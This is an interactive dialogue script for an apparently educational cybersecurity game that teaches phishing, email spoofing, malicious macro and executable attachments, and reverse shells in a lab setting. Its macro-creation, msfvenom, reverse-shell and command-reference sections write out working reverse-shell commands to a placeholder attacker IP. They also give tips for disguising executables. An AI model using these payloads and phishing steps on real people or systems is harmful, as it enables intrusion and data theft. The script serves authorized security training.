// Phishing and Social Engineering - Game Scenario Version
// Based on HacktivityLabSheets: cyber_security_landscape/3_phishing.md
// License: CC BY-SA 4.0

// Global persistent state
VAR haxolottle_rapport = 0

// External variables
EXTERNAL player_name

=== start ===
~ haxolottle_rapport = 0

Haxolottle: {player_name}, want to learn about social engineering and phishing?

Haxolottle: This is critical, little axolotl - the human element is often the most exploitable part of any security system. Technical defenses don't matter if you can convince someone to bypass them.

Haxolottle: Before we start - this covers offensive techniques. Everything here is for authorized security testing in controlled environments.

Haxolottle: We're learning these techniques to defend against them and conduct authorized penetration tests. Clear?

* [Absolutely. I understand]
    ~ haxolottle_rapport += 15
    You: Understood. Authorized testing only, controlled environments, defensive purpose.
    Haxolottle: Perfect mindset. Let's begin.
    -> social_engineering_hub
* [Yes, I'm clear]
    ~ haxolottle_rapport += 5
    You: Clear on the ethical constraints.
    Haxolottle: Good. Remember that.
    -> social_engineering_hub

=== social_engineering_hub ===
Haxolottle: What would you like to know about?

+ [Human factors in cybersecurity]
    -> human_factors_intro
+ [Phishing attack fundamentals]
    -> phishing_basics
+ [Reconnaissance and info gathering]
    -> reconnaissance_intro
+ [Email spoofing techniques]
    -> email_spoofing_intro
+ [Creating malicious attachments]
    -> malicious_attachments_intro
+ [Reverse shells and remote access]
    -> reverse_shells_intro
+ [Show me the attack workflow]
    -> attack_workflow
+ [Ethical considerations]
    -> ethics_discussion
+ [Show me commands]
    -> commands_reference
+ [I'm good for now]
    #exit_conversation
    -> END

// ===========================================
// HUMAN FACTORS IN CYBERSECURITY
// ===========================================

=== human_factors_intro ===
~ haxolottle_rapport += 5

Haxolottle: Human factors. The foundation of social engineering attacks.

Haxolottle: Technical security can be excellent—strong encryption, patched systems, robust firewalls. But all of that can be bypassed if you can convince a human to let you in.

Haxolottle: Users have mental models of security and risk. Attackers exploit gaps between those models and reality. If a user doesn't perceive danger, they won't apply security measures.

Haxolottle: The classic saying: "The user is the weakest link." It's true, but also incomplete. Users aren't inherently weak—they're often inadequately trained, using poorly designed security systems, under time pressure, making snap decisions.

* [Why do humans fall for these attacks?]
    You: What makes humans so vulnerable to social engineering?
    -> human_vulnerabilities
* [How do we defend against this?]
    You: If humans are vulnerable, how do we protect systems?
    -> human_factors_defense
* [I see—target the human, not the system]
    -> social_engineering_hub

=== human_vulnerabilities ===
~ haxolottle_rapport += 10

Haxolottle: Excellent question. Multiple factors make humans vulnerable:

Haxolottle: **Psychology**: Humans are wired for trust and helpfulness. We want to assist others. Attackers exploit that.

Haxolottle: **Cognitive biases**: Authority bias makes us trust official-looking messages. Urgency causes us to skip security checks. Curiosity makes us click suspicious links.

Haxolottle: **Complexity**: Security systems are often complicated and user-hostile. When security gets in the way of work, users find workarounds.

Haxolottle: **Information asymmetry**: Attackers know tricks users don't. A well-crafted phishing email can be nearly indistinguishable from legitimate correspondence.

Haxolottle: **Scale**: Attackers can send thousands of phishing emails. They only need one person to click. The defender has to get it right every time.

~ haxolottle_rapport += 5
-> social_engineering_hub

=== human_factors_defense ===
~ haxolottle_rapport += 10

Haxolottle: Good instinct. Defense requires layered approaches:

Haxolottle: **Security awareness training**: Educate users about phishing indicators, social engineering tactics, and safe behaviors. Make them part of the defense.

Haxolottle: **Usable security**: Design security systems that are intuitive and don't obstruct legitimate work. Security that's too burdensome will be circumvented.

Haxolottle: **Technical controls**: Email filtering, attachment sandboxing, multi-factor authentication. Don't rely solely on human vigilance.

Haxolottle: **Culture**: Create organizational culture where questioning suspicious requests is encouraged, not punished. Users should feel safe reporting potential phishing.

Haxolottle: **Regular testing**: Conduct simulated phishing campaigns to identify vulnerable users and improve training. What we're doing here—authorized, controlled testing.

~ haxolottle_rapport += 10
-> social_engineering_hub

// ===========================================
// PHISHING BASICS
// ===========================================

=== phishing_basics ===
~ haxolottle_rapport += 5

Haxolottle: Phishing. One of the most effective attack vectors in cybersecurity.

Haxolottle: Phishing is social engineering via electronic communication—typically email. The attacker crafts a message designed to trick the recipient into:
- Revealing sensitive information (credentials, financial data)
- Clicking malicious links (web attacks, credential harvesting)
- Opening malicious attachments (malware installation)

Haxolottle: This lab focuses on the attachment vector. Getting a victim to execute malicious code by opening a document or program.

Haxolottle: Once they open that attachment, the attacker gains access to their system. From there: data theft, lateral movement, persistent access.

* [Tell me about spear phishing]
    You: What's the difference between phishing and spear phishing?
    -> spear_phishing_explanation
* [How successful are phishing attacks?]
    You: Do these attacks actually work in practice?
    -> phishing_success_rates
* [What makes a phishing email convincing?]
    You: How do attackers make emails look legitimate?
    -> convincing_phishing
* [Understood]
    -> social_engineering_hub

=== spear_phishing_explanation ===
~ haxolottle_rapport += 10

Haxolottle: Important distinction.

Haxolottle: **Phishing**: Broad, untargeted attacks. Send millions of generic emails, hope a small percentage responds. Spray and pray approach.

Haxolottle: **Spear phishing**: Targeted attacks against specific individuals or organizations. Attacker researches the target, customizes the message, references real information.

Haxolottle: Spear phishing is dramatically more effective. When an email mentions your colleague by name, references a real project, comes from what appears to be a trusted source—much harder to detect.

Haxolottle: This lab simulates spear phishing. You'll research targets, craft personalized messages, exploit relationships and trust.

Haxolottle: In real-world APT (Advanced Persistent Threat) attacks, spear phishing is often the initial compromise. High-value targets get carefully researched, precisely targeted emails.

~ haxolottle_rapport += 10
-> social_engineering_hub

=== phishing_success_rates ===
~ haxolottle_rapport += 8

Haxolottle: Disturbingly successful.

Haxolottle: Industry studies show phishing success rates vary widely, but typical ranges:
- 10-30% of recipients open phishing emails
- 5-15% click malicious links or open attachments
- Even with training, 2-5% still fall for sophisticated phishing

Haxolottle: That might sound low, but in an organization with 1000 employees, that's 20-50 successful compromises from a single campaign.

Haxolottle: Spear phishing success rates are much higher—30-45% click rates are common. Highly personalized attacks can achieve 60%+ success.

Haxolottle: The economics favor attackers: sending 10,000 phishing emails costs nearly nothing. Even 1% success is profitable.

Haxolottle: And one successful compromise can be enough. One executive's email account, one developer's credentials, one system admin's access—that's your foothold.

~ haxolottle_rapport += 8
-> social_engineering_hub

=== convincing_phishing ===
~ haxolottle_rapport += 10

Haxolottle: The art of the convincing phish. Several key elements:

Haxolottle: **Legitimate-looking sender**: Spoofed email addresses from trusted domains. We'll cover technical spoofing shortly.

Haxolottle: **Personalization**: Use target's name, reference their role, mention real colleagues or projects.

Haxolottle: **Context and pretext**: Create plausible reason for contact. "Financial report for review," "urgent HR policy update," "document you requested."

Haxolottle: **Professional presentation**: Proper grammar, corporate branding, official-looking signatures. Amateur phishing is easy to spot—professional phishing is not.

Haxolottle: **Appropriate attachments**: Send document types the target would expect to receive. Accountants get spreadsheets, lawyers get legal documents, designers get graphics.

Haxolottle: **Psychological triggers**: Authority (from executive), urgency (immediate action needed), fear (account suspended), curiosity (confidential information).

Haxolottle: Combine these elements, and you create emails that even security-aware users might trust.

~ haxolottle_rapport += 10
-> social_engineering_hub

// ===========================================
// RECONNAISSANCE
// ===========================================

=== reconnaissance_intro ===
~ haxolottle_rapport += 5

Haxolottle: Reconnaissance. The foundation of targeted attacks.

Haxolottle: Before crafting phishing emails, you need intelligence: employee names, email addresses, roles, relationships, interests.

Haxolottle: In this simulation, you'll browse a target organization's website. In real operations, reconnaissance is much broader:

Haxolottle: **OSINT (Open Source Intelligence)**: LinkedIn profiles, company websites, social media, press releases, job postings, conference presentations.

Haxolottle: **Email pattern analysis**: Most organizations follow predictable patterns. firstname.lastname@company.com, flastname@company.com, etc.

Haxolottle: **Relationship mapping**: Who works with whom? Who reports to whom? Who's friends outside work?

Haxolottle: **Interest identification**: What are targets passionate about? Sports teams, hobbies, causes? These can be social engineering hooks.

* [How much reconnaissance is typical?]
    You: How long do attackers spend on reconnaissance?
    -> recon_timeframes
* [What tools help with OSINT?]
    You: Are there tools that automate information gathering?
    -> osint_tools
* [Got it—gather intelligence first]
    -> social_engineering_hub

=== recon_timeframes ===
~ haxolottle_rapport += 8

Haxolottle: Depends on the operation and target value.

Haxolottle: **Opportunistic attacks**: Minimal reconnaissance. Attacker identifies employee email addresses and sends generic phishing. Hours or less.

Haxolottle: **Targeted campaigns**: Days to weeks. Research key employees, understand organizational structure, identify high-value targets.

Haxolottle: **APT operations**: Months. Nation-state actors conducting espionage might spend extensive time profiling targets, mapping networks, planning multi-stage operations.

Haxolottle: The more valuable the target, the more reconnaissance is justified. Compromising a Fortune 500 CEO's email? Weeks of careful research is worthwhile.

Haxolottle: For this lab, you'll spend 15-30 minutes on reconnaissance. Enough to understand the organization and personalize attacks, but compressed for training purposes.

~ haxolottle_rapport += 5
-> social_engineering_hub

=== osint_tools ===
~ haxolottle_rapport += 10

Haxolottle: Many tools assist OSINT:

Haxolottle: **theHarvester**: Scrapes search engines, social media for email addresses and names associated with a domain.

Haxolottle: **Maltego**: Visual link analysis. Maps relationships between people, companies, domains, infrastructure.

Haxolottle: **recon-ng**: Framework for web reconnaissance. Modules for gathering information from various sources.

Haxolottle: **SpiderFoot**: Automated OSINT gathering from 100+ sources.

Haxolottle: **LinkedIn, Facebook, Twitter**: Directly browsing social media often reveals extensive information. People share surprising amounts publicly.

Haxolottle: **Google dorking**: Advanced search operators to find exposed information. site:target.com filetype:pdf reveals documents, for example.

Haxolottle: **Shodan**: Search engine for internet-connected devices. Find exposed services and infrastructure.

Haxolottle: For this exercise, you'll manually browse the target website. Simple, but effective for understanding the process.

~ haxolottle_rapport += 10
-> social_engineering_hub

// ===========================================
// EMAIL SPOOFING
// ===========================================

=== email_spoofing_intro ===
~ haxolottle_rapport += 5

Haxolottle: Email spoofing. Fundamental to convincing phishing.

Haxolottle: Email protocols (SMTP) have a critical flaw: the "From" address is not authenticated. You can claim to be anyone.

Haxolottle: When you send an email, you specify the sender address. Nothing inherently prevents you from specifying someone else's address.

Haxolottle: This is why phishing can appear to come from trusted sources—colleagues, executives, IT departments, banks.

Haxolottle: Modern defenses exist: SPF, DKIM, DMARC—technologies that authenticate sender domains. But implementation is inconsistent, and many organizations haven't deployed them properly.

* [Tell me about SPF/DKIM/DMARC]
    You: How do those authentication technologies work?
    -> email_authentication
* [How do I spoof emails in this lab?]
    You: What's the technique for spoofing sender addresses?
    -> spoofing_technique
* [Why hasn't this been fixed?]
    You: If this is a known problem, why hasn't email been redesigned?
    -> email_design_problems
* [Understood—email spoofing is possible]
    -> social_engineering_hub

=== email_authentication ===
~ haxolottle_rapport += 10

Haxolottle: Good question. Email authentication mechanisms:

Haxolottle: **SPF (Sender Policy Framework)**: DNS record specifying which mail servers are authorized to send email for a domain. Receiving servers check if email came from authorized server.

Haxolottle: **DKIM (DomainKeys Identified Mail)**: Cryptographic signature attached to emails. Proves email wasn't modified in transit and came from declared domain.

Haxolottle: **DMARC (Domain-based Message Authentication, Reporting, Conformance)**: Policy framework built on SPF and DKIM. Tells receiving servers what to do with emails that fail authentication—reject, quarantine, or accept with warning.

Haxolottle: When properly implemented, these make spoofing much harder. But "properly implemented" is key.

Haxolottle: Many organizations haven't configured DMARC. Many email servers don't strictly enforce these policies. Spoofing remains viable in many scenarios.

~ haxolottle_rapport += 10
-> social_engineering_hub

=== spoofing_technique ===
~ haxolottle_rapport += 8

Haxolottle: In this lab, spoofing is straightforward.

Haxolottle: In Thunderbird email client, you can customize the "From" address. Click the dropdown next to your address, select "Customize From Address," and enter whatever you want.

Haxolottle: In the simulation, this works seamlessly—no authentication checks. In real environments, spoofing might be blocked by email server policies or recipient filtering.

Haxolottle: Other spoofing approaches:
- Using SMTP directly with telnet or specialized tools
- Configuring mail servers with fake sender information
- Exploiting misconfigured email servers that don't require authentication

Haxolottle: The simulation simplifies this to focus on social engineering tactics rather than technical bypasses.

~ haxolottle_rapport += 5
-> social_engineering_hub

=== email_design_problems ===
~ haxolottle_rapport += 10

Haxolottle: Excellent critical thinking.

Haxolottle: Email protocols date to early internet days—1980s SMTP. Security wasn't a primary concern. Ease of use and interoperability were priorities.

Haxolottle: Redesigning email faces massive challenges:
- **Legacy compatibility**: Billions of systems rely on existing protocols
- **Decentralization**: Email has no central authority to enforce changes
- **Deployment inertia**: Organizations resist upgrading working systems
- **Complexity**: Cryptographic authentication adds complexity users might not understand

Haxolottle: SPF/DKIM/DMARC are retrofit solutions—adding authentication to existing protocols. They work, but require universal adoption to be fully effective.

Haxolottle: Classic security challenge: replacing widely-deployed insecure systems is incredibly difficult, even when better alternatives exist.

Haxolottle: Lesson: technical debt and legacy systems create enduring vulnerabilities. Design security in from the start, because retrofitting is painful.

~ haxolottle_rapport += 15
-> social_engineering_hub

// ===========================================
// MALICIOUS ATTACHMENTS
// ===========================================

=== malicious_attachments_intro ===
~ haxolottle_rapport += 5

Haxolottle: Malicious attachments. The payload delivery mechanism.

Haxolottle: Once you've crafted a convincing phishing email, you need a malicious attachment that compromises the target's system when opened.

Haxolottle: Three main types we'll cover:
1. **Executable programs**: Compiled malware that runs directly
2. **Office documents with macros**: Word/Excel/LibreOffice files containing malicious scripts
3. **Exploit documents**: Files that exploit vulnerabilities in document readers

Haxolottle: The choice depends on your target. Different roles expect different file types.

* [Tell me about choosing appropriate attachment types]
    You: How do I match attachments to targets?
    -> attachment_targeting
* [Explain macros in documents]
    You: How do office macros work as attack vectors?
    -> macro_explanation
* [Show me executable payloads]
    You: What about standalone malware programs?
    -> executable_payloads
* [I understand the options]
    -> social_engineering_hub

=== attachment_targeting ===
~ haxolottle_rapport += 10

Haxolottle: Matching attachments to targets—critical for success.

Haxolottle: **Accountants and finance**: Expect spreadsheets. LibreOffice Calc (.ods) or Excel (.xlsx) with macros. "Quarterly report," "budget analysis," "expense tracking."

Haxolottle: **Executives and managers**: Might receive various documents. Word documents (.docx, .odt) with "strategic plan," "board presentation," "confidential memo."

Haxolottle: **IT and technical staff**: Might be suspicious of documents, but could receive scripts, logs, or technical reports. Executable tools less suspicious to technical users.

Haxolottle: **HR departments**: Resumes, applications, employee documents. Word documents or PDFs.

Haxolottle: **General principle**: Send what the target expects to receive in their role. Accountants opening unexpected executables? Suspicious. Accountants opening financial spreadsheets? Routine.

Haxolottle: In this simulation, targets have preferences. Some will only open specific file types. Pay attention to their roles and feedback.

~ haxolottle_rapport += 10
-> social_engineering_hub

=== macro_explanation ===
~ haxolottle_rapport += 5

Haxolottle: Office macros. Powerful and frequently exploited.

Haxolottle: Macros are scripts embedded in office documents—Microsoft Office or LibreOffice. Originally designed for automating document tasks: calculations, formatting, data processing.

Haxolottle: Macro languages (Visual Basic for Applications in MS Office, LibreOffice Basic) are full programming languages. They can:
- Execute system commands
- Access files and network resources
- Download and run additional malware
- Steal data

Haxolottle: Modern office software warns users about macros. But many users click "Enable Macros" without understanding the risk—especially if the document looks legitimate and they expect to receive it.

Haxolottle: Social engineering comes into play: "This document contains macros required to view the content. Please enable macros to continue."

* [How do I create a malicious macro?]
    You: Walk me through creating a macro payload.
    -> macro_creation
* [What defenses exist against macro malware?]
    You: How do organizations protect against malicious macros?
    -> macro_defenses
* [Got the concept]
    -> social_engineering_hub

=== macro_creation ===
~ haxolottle_rapport += 10

Haxolottle: Creating a malicious macro—walkthrough:

Haxolottle: **Step 1**: Open LibreOffice Writer or Calc. Tools → Macros → Organize Macros → Basic.

Haxolottle: **Step 2**: Create new macro in your document. Click document name, click "New."

Haxolottle: **Step 3**: Write the macro code. Example using Shell command to execute system commands:

Haxolottle: `Sub Main
  Shell("/bin/nc", vbNormalFocus, "-e /bin/sh YOUR_IP 8080")
End Sub`

Haxolottle: This creates a reverse shell—connects back to your system with command line access.

Haxolottle: **Step 4**: Configure macro to run on document open. Tools → Customize → Events → Open Document → Macro → select your macro.

Haxolottle: **Step 5**: Add convincing content to document. Financial data, corporate memo, whatever fits your pretext.

Haxolottle: **Step 6**: Save as .odt or .ods. Attach to phishing email.

Haxolottle: When victim opens document and enables macros (or if their security is set to low), your payload executes.

~ haxolottle_rapport += 10
-> social_engineering_hub

=== macro_defenses ===
~ haxolottle_rapport += 10

Haxolottle: Macro defenses—layered approach:

Haxolottle: **Technical controls:**
- Disable macros by default (most modern office software does this)
- Block macros from internet-sourced documents
- Application whitelisting—only approved programs can execute
- Email gateway scanning for malicious macros

Haxolottle: **User training:**
- Educate users never to enable macros in unexpected documents
- Teach users to verify sender through out-of-band communication
- Create culture where users question suspicious documents

Haxolottle: **Policy enforcement:**
- Organizational policies prohibiting macro usage except for approved documents
- Removal of macro execution capabilities from standard user systems
- Require code signing for legitimate macros

Haxolottle: The challenge: many organizations legitimately use macros for business processes. Completely blocking them disrupts workflow. Balance between usability and security.

Haxolottle: Defense-in-depth: combine technical controls, user awareness, and policy. No single measure is perfect.

~ haxolottle_rapport += 10
-> social_engineering_hub

=== executable_payloads ===
~ haxolottle_rapport += 5

Haxolottle: Executable malware payloads. More direct than macros.

Haxolottle: Standalone programs that run malicious code when executed. Typically ELF binaries on Linux, EXE on Windows.

Haxolottle: Advantage: No need for user to enable macros. If they run the file, it executes.

Haxolottle: Disadvantage: More obviously suspicious. Users might question why they're being sent a program rather than a document.

Haxolottle: Works better with technical targets who might expect to receive tools, scripts, or utilities.

* [How do I create an executable payload?]
    You: What tools create malicious executables?
    -> msfvenom_payloads
* [How do attackers disguise executables?]
    You: How do you make executables look legitimate?
    -> executable_disguises
* [Understood]
    -> social_engineering_hub

=== msfvenom_payloads ===
~ haxolottle_rapport += 10

Haxolottle: msfvenom. Metasploit Framework's payload generator.

Haxolottle: Creates standalone payloads for various platforms. For Linux targets:

Haxolottle: `msfvenom -a x64 --platform linux -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o malware`

Haxolottle: Breaking this down:
- `-a x64` — architecture (64-bit)
- `--platform linux` — target OS
- `-p linux/x64/shell_reverse_tcp` — payload type (reverse shell)
- `LHOST=YOUR_IP` — your IP for callback
- `LPORT=4444` — your listening port
- `-f elf` — output format (Linux executable)
- `-o malware` — output filename

Haxolottle: Before sending, set up listener to receive connection:
`nc -lvvp 4444`

Haxolottle: When victim runs the malware, it connects back to you. You get command line access to their system.

Haxolottle: msfvenom can generate payloads for any platform, architecture, and access method. Incredibly versatile tool.

~ haxolottle_rapport += 10
-> social_engineering_hub

=== executable_disguises ===
~ haxolottle_rapport += 8

Haxolottle: Disguising executables—social engineering and technical tricks:

Haxolottle: **Naming**: Use document-like names. "Financial_Report.pdf.exe" (exploiting hidden file extensions on Windows). On Linux: "report.sh" looks like a script, more plausible than random binary.

Haxolottle: **Icons**: Change executable icon to document icon. Makes files appear to be documents visually.

Haxolottle: **Packers and crypters**: Obfuscate executable code to avoid antivirus detection. Tools like UPX, custom packers.

Haxolottle: **Legitimate tool abuse**: Package malicious code with legitimate software. "Install this tool to view the document."

Haxolottle: **Pretext engineering**: Convince target they need to run the program. "Security update," "codec required," "validation tool."

Haxolottle: In practice, getting users to run raw executables is harder than macro documents. But with right pretext and target, it works.

~ haxolottle_rapport += 8
-> social_engineering_hub

// ===========================================
// REVERSE SHELLS
// ===========================================

=== reverse_shells_intro ===
~ haxolottle_rapport += 5

Haxolottle: Reverse shells. The goal of attachment-based phishing.

Haxolottle: **Normal shell**: You connect TO a remote system. You initiate the connection.

Haxolottle: **Reverse shell**: Remote system connects TO you. Victim's machine initiates the connection.

Haxolottle: Why reverse? Several advantages:
- Bypasses firewalls (outbound connections usually allowed, inbound blocked)
- No need for victim to have open ports
- Works from behind NAT
- Victim's actions trigger connection

* [How do reverse shells work technically?]
    You: Explain the technical mechanism.
    -> reverse_shell_mechanics
* [What can I do with remote shell access?]
    You: Once I have a shell, what's next?
    -> post_exploitation_basics
* [Understood the concept]
    -> social_engineering_hub

=== reverse_shell_mechanics ===
~ haxolottle_rapport += 10

Haxolottle: Reverse shell mechanics—simple but elegant:

Haxolottle: **Your system (attacker)**:
Set up listener waiting for connections:
`nc -lvvp 4444`

This listens on port 4444. When victim connects, you get their command line.

Haxolottle: **Victim's system**:
Malicious payload runs, connecting back to you:
`nc -e /bin/sh YOUR_IP 4444`

Or embedded in macro, executable, whatever payload you delivered.

Haxolottle: **Result**:
Victim's machine makes outbound connection to your IP:4444. Your listener accepts connection. You now type commands that execute on victim's system.

Haxolottle: **Network perspective**:
From network monitoring, looks like victim initiated connection to external IP. Harder to distinguish from legitimate traffic than inbound connection to victim.

Haxolottle: Tools like netcat, msfvenom payloads, custom scripts—all create reverse shell connections.

~ haxolottle_rapport += 10
-> social_engineering_hub

=== post_exploitation_basics ===
~ haxolottle_rapport += 10

Haxolottle: Post-exploitation. What you do after gaining access.

Haxolottle: **Initial assessment**:
- `whoami` — what user are you?
- `pwd` — where are you in filesystem?
- `ls -la` — what's in current directory?
- `uname -a` — system information

Haxolottle: **Objective completion**:
For this lab: read flag files in home directories. In real operations: depends on goals.

Haxolottle: **Common post-exploitation actions**:
- Privilege escalation (gain root/admin access)
- Lateral movement (compromise additional systems)
- Data exfiltration (steal information)
- Persistence (maintain access for future use)
- Covering tracks (delete logs, hide presence)

Haxolottle: **Limitations of simple shells**:
Basic netcat shells are fragile—no TTY, limited interaction, easily disconnected. Advanced: upgrade to Meterpreter, SSH tunnel, or other robust access methods.

Haxolottle: For this lab, simple shell is sufficient to read flags and demonstrate access.

~ haxolottle_rapport += 10
-> social_engineering_hub

// ===========================================
// ATTACK WORKFLOW
// ===========================================

=== attack_workflow ===
~ haxolottle_rapport += 5

Haxolottle: Complete attack workflow for this lab:

Haxolottle: **Phase 1 - Reconnaissance**:
- Browse target organization website (accountingnow.com)
- Document employee names, email addresses, roles
- Note potential interests, relationships

Haxolottle: **Phase 2 - Payload Preparation**:
- Set up netcat listener: `nc -lvvp 4444` or `nc -lvvp 8080`
- Create malicious attachment:
  * Macro document (LibreOffice with Shell command)
  * Executable payload (msfvenom)
- Match payload type to target role

Haxolottle: **Phase 3 - Email Crafting**:
- Compose phishing email in Thunderbird
- Spoof sender to trusted source (colleague, manager)
- Personalize content (use target's name, reference their role)
- Create plausible pretext for attachment
- Attach malicious file

Haxolottle: **Phase 4 - Engagement**:
- Send email
- Monitor for replies (simulation provides feedback)
- Refine approach based on victim responses
- Iterate until victim opens attachment

Haxolottle: **Phase 5 - Exploitation**:
- Victim opens attachment, payload executes
- Reverse shell connects to your listener
- You gain remote access

Haxolottle: **Phase 6 - Objective**:
- Navigate filesystem: `ls -la`, `cd /home/victim`
- Read flag files: `cat flag`
- Submit flags to prove success

+ [Back to main menu]
    -> social_engineering_hub

// ===========================================
// ETHICS DISCUSSION
// ===========================================

=== ethics_discussion ===
~ haxolottle_rapport += 10

Haxolottle: Critical topic. Ethical considerations.

Haxolottle: The techniques you're learning are powerful and potentially harmful. Let's be absolutely clear about ethical boundaries:

Haxolottle: **Authorized testing only**: Everything we've covered is for authorized penetration testing within controlled environments. Using these techniques against systems you don't have explicit written permission to test is illegal—computer fraud, unauthorized access, potential felony charges.

Haxolottle: **Simulation vs reality**: This lab is a controlled simulation. Victims are non-existent. In real penetration tests, you're testing real employees with real systems, under contract, with defined scope.

Haxolottle: **Defensive purpose**: You're learning these techniques to:
- Conduct authorized security assessments
- Understand attacker methods to build defenses
- Train others in recognizing social engineering
- Improve organizational security posture

Haxolottle: **Professional responsibility**: Security professionals must operate ethically. Our field requires trust. Abuse these skills and you damage the entire profession.

* [What about "ethical hacking" justifications?]
    You: I've heard people justify unauthorized testing as "ethical hacking" to help organizations.
    -> ethical_hacking_discussion
* [How do legitimate penetration tests work?]
    You: How does authorized testing differ from what we're practicing?
    -> pentest_process
* [I understand the ethical boundaries]
    You: Clear on the ethics. Authorized testing, defensive purpose, professional responsibility.
    Haxolottle: Excellent. Remember that throughout your career.
    ~ haxolottle_rapport += 15
    -> social_engineering_hub

=== ethical_hacking_discussion ===
~ haxolottle_rapport += 15

Haxolottle: "Ethical hacking" without authorization is a contradiction.

Haxolottle: Some people justify unauthorized penetration testing as "helping" organizations by exposing vulnerabilities. This is wrong on multiple levels:

Haxolottle: **Legally**: Unauthorized access is illegal, regardless of intent. "I was trying to help" is not a legal defense. You can be prosecuted.

Haxolottle: **Ethically**: You're making decisions about acceptable risk for someone else's systems without their consent. Not your choice to make.

Haxolottle: **Practically**: Penetration testing can cause disruptions, trigger incident responses, waste security team resources. Unauthorized testing creates real costs.

Haxolottle: **Professionally**: It demonstrates poor judgment and lack of integrity. Organizations won't hire security professionals who've demonstrated willingness to break rules.

Haxolottle: **Proper approach**: If you identify a vulnerability, responsible disclosure. Report it to the organization through appropriate channels (security contact, bug bounty program). Let them decide how to handle it.

Haxolottle: The distinction is consent. Authorized testing with consent is ethical. Unauthorized testing without consent is not—even with "good intentions."

~ haxolottle_rapport += 20
-> social_engineering_hub

=== pentest_process ===
~ haxolottle_rapport += 15

Haxolottle: Legitimate penetration testing process:

Haxolottle: **Engagement and contracting**:
- Client requests penetration test
- Scope is defined: which systems, which methods, what's off-limits
- Contract specifies deliverables, timeline, liability
- Written authorization provided
- Emergency contacts established

Haxolottle: **Rules of engagement**:
- Testing windows (when testing is permitted)
- Prohibited actions (don't DOS production systems, don't access sensitive data types)
- Notification procedures (how to report critical findings immediately)
- Legal protections and authorizations

Haxolottle: **Execution**:
- Testing conducted within agreed scope
- Documentation of all actions
- Communication with client contact
- Immediate reporting of critical vulnerabilities

Haxolottle: **Reporting**:
- Comprehensive report of findings
- Risk ratings and remediation recommendations
- Executive summary for leadership
- Technical details for security teams
- Retest to verify fixes

Haxolottle: This structured, authorized, documented process is what makes penetration testing ethical and legal. Everything else is unauthorized hacking.

~ haxolottle_rapport += 15
-> social_engineering_hub

=== commands_reference ===
Haxolottle: Here's your command reference, little axolotl.

Haxolottle: **Setting up listener**:
`nc -lvvp 4444`

Haxolottle: **Creating macro payload**:
Open LibreOffice, Tools → Macros → Edit Macros, add your shell command

Haxolottle: **Creating executable payload**:
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf > payload.elf`

Haxolottle: **Testing reverse shell locally**:
`bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`

Haxolottle: **Shell navigation**:
- List files: `ls -la`
- Change directory: `cd /home/victim`
- Read files: `cat filename`
- Check location: `pwd`

+ [Back to main menu]
    -> social_engineering_hub

-> END
